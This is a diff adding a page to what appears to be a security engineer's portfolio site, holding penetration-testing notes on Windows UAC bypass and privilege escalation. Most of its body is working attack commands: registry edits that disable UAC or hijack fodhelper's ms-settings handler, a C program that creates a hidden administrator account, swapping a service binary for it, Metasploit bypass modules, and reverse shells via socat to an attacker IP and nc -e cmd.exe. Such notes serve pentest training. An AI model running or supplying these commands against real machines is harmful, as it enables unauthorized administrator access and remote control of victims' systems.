@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="assets/css/method-styles.css">
+
+    <title>TITLE</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="#" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="#home" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="a1319b8f-e709-42cc-a830-08cee3a62da1" class="page sans"><header><h1 class="page-title">UAC Bypass</h1></header><div class="page-body"><ul id="d214efbb-f228-4f93-ac5a-d4fe1d103fd2" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></li></ul><ul id="508281db-61ca-44eb-b6cc-52b63f989f56" class="bulleted-list"><li style="list-style-type:disc">Once you have a reverse shell, check the user permissions with</li></ul><ul id="2c2a1647-0a46-489c-8fcd-50c1be8e7b4c" class="bulleted-list"><li style="list-style-type:disc"><em>whoami /groups</em></li></ul><ul id="00aa0a62-e98a-4753-9e07-0980dc9db0df" class="bulleted-list"><li style="list-style-type:disc">Even though you&#x27;re a local admin, you&#x27;ll see the shell you have is 
+running at a Medium Mandatory Level. That means that many actions will 
+be prohibited by UAC, and this should ring a bell.</li></ul><ul id="c122d257-8c79-4977-b562-e22ec1a8f20d" class="bulleted-list"><li style="list-style-type:disc">Because of the way of how UAC exploit work, they are often developed for specific OS versions and build. </li></ul><ul id="c77c437a-60ac-42f4-aac2-1ca21e5f4dde" class="bulleted-list"><li style="list-style-type:disc"><em>systeminfo</em></li></ul><ul id="117d3391-54d4-4ccb-959a-2c03ec33913e" class="bulleted-list"><li style="list-style-type:disc">To get more information about that (OS Name and OS Version)<p id="ec2e62b9-f44a-49f7-8a45-112e6e2a85a3" class="">- Google &quot;OS name + version + &#x27;uac bypass&#x27;&quot;.</p></li></ul><p id="199f4a1d-e71b-40fa-a313-21a5fae884a3" class=""><strong>Try spawning high integrity shell:</strong></p><pre id="c16c45b3-3be0-4120-b9d5-471139540fe4" class="code"><code>powershell.exe Start-Process cmd.exe -Verb runAs
+Start-Process -NoNewWindow -FilePath C:/File.exe</code></pre><p id="a90860ba-0a38-40ba-8393-1a4d45f0e06e" class="">Disable UAC:</p><pre id="087e4de2-bd45-4858-b296-b6fb44c7d526" class="code"><code>C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></pre><p id="f3d46ebb-49a0-4dfa-9de6-a7abead6d9c6" class="">
+</p><p id="3b8e36ab-9c55-41dc-b8b5-b8bd7cf9cb82" class="">Metasploit  (W10) UAC bypass</p><pre id="03bf15f6-649b-4dde-a4cd-af6968b94191" class="code"><code>exploit(windows/local/bypassuac_sdclt)</code></pre><p id="7ca7e2e2-0a4a-4cdc-9a0f-942fc66e4d5d" class="">
+</p><p id="917f454e-5638-4d15-97ac-51d329378e5f" class="">https://github.com/L3cr0f/DccwBypassUAC</p><pre id="9a9bd982-3b48-4d99-8345-a04655c07a82" class="code"><code>powershell.exe Start-Process cmd.exe -Verb runAs</code></pre><p id="3de9cc41-9dbc-49c0-93f3-58618e62166e" class="">
+</p><p id="dd95f36f-7367-4121-93d2-8c1306ce7a78" class="">Eventviewer UAC bypass</p><pre id="446ace3b-ca37-4e8c-bb09-286fb78d9577" class="code"><code>https://github.com/CsEnox/EventViewer-UACBypass</code></pre><p id="9211926b-640e-4b6d-91b3-b400180d067c" class="">Fodhelper</p><pre id="036a52dc-d9ab-40f1-89b1-6c2bd33b1a6c" class="code"><code>sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f
+net user admin password123!
+</code></pre><p id="7b0b5183-e5d0-4040-ab40-3b408eedcc2a" class="">
+</p><p id="c60da5d3-928f-4cf6-ba49-f4b8d9570781" class=""><strong>Insecure File Permissions:</strong></p><p id="b28e1ae0-8c30-4667-ab62-f0ede49c20e3" class="">
+</p><table id="77f2892f-b7e0-402a-b987-bdc648005293" class="simple-table"><tbody><tr id="2a66b15c-43a6-4ca9-a96c-0131c024a49f"><td id="IU}o" class="">Mask</td><td id="loe|" class="">Permissions</td></tr><tr id="dce4e9e4-ea9e-4ee7-92d9-4fc3ca6a840b"><td id="IU}o" class="">F</td><td id="loe|" class="">Full access</td></tr><tr id="c3c86bd6-1714-49df-8ade-23dcab4e0e90"><td id="IU}o" class="">M</td><td id="loe|" class="">Modify access</td></tr><tr id="1781eb3a-ae33-48a1-9153-c4299350605a"><td id="IU}o" class="">RX</td><td id="loe|" class="">Read and execute access</td></tr><tr id="30ca2de4-6a81-49f3-a6dc-bf0a87fd4a53"><td id="IU}o" class="">R</td><td id="loe|" class="">Read-only access</td></tr><tr id="5d406deb-008b-424c-a2e9-3a335ae17c14"><td id="IU}o" class="">W</td><td id="loe|" class="">Write-only access</td></tr></tbody></table><h3 id="0acaa968-9b53-4227-b4a9-55891c2de03d" class="">Identifying a running service:</h3><pre id="4c83fd07-f249-4b79-9feb-cab0be14ed36" class="code"><code>PS&gt; Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like &#x27;Running&#x27;}
+#service running is returned...
+icacls &quot;C:\Program Files\Serviio\bin\Service.exe&quot;
+#Check permissions</code></pre><h3 id="f3ca950e-4b55-465f-8d02-7d890510d613" class="">Adding a user exe: (adduser.c)</h3><pre id="697c2cee-92eb-4a31-90b6-6e3f6de527e6" class="code"><code>#include &lt;stdlib.h&gt;
+
+int main ()
+{
+  int i;
+  
+  i = system (&quot;net user test Password123! /add&quot;);
+  i = system (&quot;net localgroup administrators test /add&quot;);
+  
+  return 0;
+}</code></pre><pre id="ee1299b6-4913-4e31-a36d-6ccbb179f8bf" class="code"><code>#Compile c to exe on linux...
+i686-w64-mingw32-gcc adduser.c -o adduser.exe</code></pre><h3 id="db4158b1-d657-4645-be99-e2936bd3c3fe" class="">Replacing running service with ours:</h3><pre id="25d280f0-05e5-4da4-aed5-4f1aaa95a606" class="code"><code>move &quot;C:\Program Files\Service\bin\Service.exe&quot; &quot;C:\Program Files\Serviio\bin\Service_original.exe&quot;
+move adduser.exe &quot;C:\Program Files\Service\bin\Service.exe&quot;
+dir &quot;C:\Program Files\Serviio\bin\&quot;
+net stop Serviio
+wmic service where caption=&quot;Service&quot; get name, caption, state, startmode
+</code></pre><pre id="64020d1d-a42e-42ca-9b7d-38c9905a06ca" class="code"><code>shutdown /r /t 0</code></pre><pre id="6ec83402-61f0-4e5a-a0a2-a70f9ca45f87" class="code"><code>net localgroup Administrators</code></pre><p id="734c725e-909d-45c3-bd91-7dc1eca21bb6" class="">
+</p><h2 id="c49a44dd-b1eb-4a4b-b1c0-0d94cfa3445e" class=""><strong><strong>GUI based bypasses:</strong></strong></h2><p id="d58ac567-7560-4431-8d25-d970b4d93dfd" class="">
+</p><pre id="84e797b1-b4e2-4287-90b3-884d889b16cc" class="code"><code>#On remote desktop session
+Run -&gt; msconfig OR Startmenu -&gt; msconfig
+# we can spawn a shell from a High Integrity Level program
+Run High IL Program -&gt; Help -&gt; View Source (Opens a notepad) -&gt; Open C:\Windows\System32\cmd.exe</code></pre><p id="ad5a71ed-28e8-4909-a698-b29b2a1a5ae0" class="">
+</p><h2 id="2a7cc788-c945-4524-aaa1-47022c9060ff" class="">Auto-Elevating Processes:</h2><p id="6d7006b1-6a3c-421f-82e0-2feaafe979b4" class="">For an application, some requirements need to be met to auto-elevate:</p><ul id="48d6c3aa-bec6-4b49-aa76-9744feea30e5" class="bulleted-list"><li style="list-style-type:disc">The executable must be signed by the Windows Publisher</li></ul><ul id="23c0f3a3-9a35-4ae2-93c5-99e0f5e2d610" class="bulleted-list"><li style="list-style-type:disc">The executable must be contained in a trusted directory, like <code>%SystemRoot%/System32/</code> or <code>%ProgramFiles%/</code></li></ul><p id="056d0c26-f9b4-4421-b42d-afc03e5f073d" class="">Depending on the type of application, additional requirements may apply:</p><ul id="dd3052c0-3e32-472b-aca5-741562785b3b" class="bulleted-list"><li style="list-style-type:disc">Executable files (.exe) must declare the <strong>autoElevate</strong> element inside their manifests. To check a file&#x27;s manifest, we can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck"><strong>sigcheck</strong></a>, a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on <code>C:\tools\</code> . If we check the manifest for msconfig.exe, we will find the autoElevate property:</li></ul><p id="75a14e70-764b-4f68-bd87-2c49e61acc30" class="">
+</p><pre id="ef38bd65-5a80-4f53-9f02-b179272e05f2" class="code"><code>set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD=&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes&quot;
+reg add %REG_KEY% /v &quot;DelegateExecute&quot; /d &quot;&quot; /f
+reg add %REG_KEY% /d %CMD% /f
+nc -lvp 4444</code></pre><p id="59885bca-08e8-4496-a273-f72f52fe01d9" class="">
+</p><h2 id="2ce81eff-e212-4e40-8f03-418a4b5737b7" class="">Other:</h2><pre id="a4d4717d-0246-4feb-bc2b-dc6ee5832a8a" class="code"><code>reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c C:\Users\user\nc.exe -nv 0.0.0.0 445 -e cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f</code></pre><p id="def199c6-4dcb-4162-a5f8-2e704fe73037" class=""><strong>Metasploit UAC bypass:</strong></p><pre id="ebeb3641-2685-4dea-96d7-4a060608c089" class="code"><code>exploit(windows/local/bypassuac_sdclt)
+#Another that might work
+https://github.com/L3cr0f/DccwBypassUAC</code></pre><p id="293f0103-de1b-491f-915f-328b9639901a" class="">
+</p><p id="815216c6-7ba8-4638-8797-f47f56bab901" class="">
+</p><h2 id="7b704e3b-0a00-420b-9c4a-661a4a511787" class=""><strong>Bypassing Always Notify:</strong></h2><p id="b9293e04-71a3-45bf-b575-1bf1edc16673" class="">
+</p><pre id="8be53a16-9b97-4445-ac98-7a5b0849ce23" class="code"><code>#TODO</code></pre><p id="006a77b0-4c3e-4ca3-8158-6ebf39bc6780" class="">
+</p></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
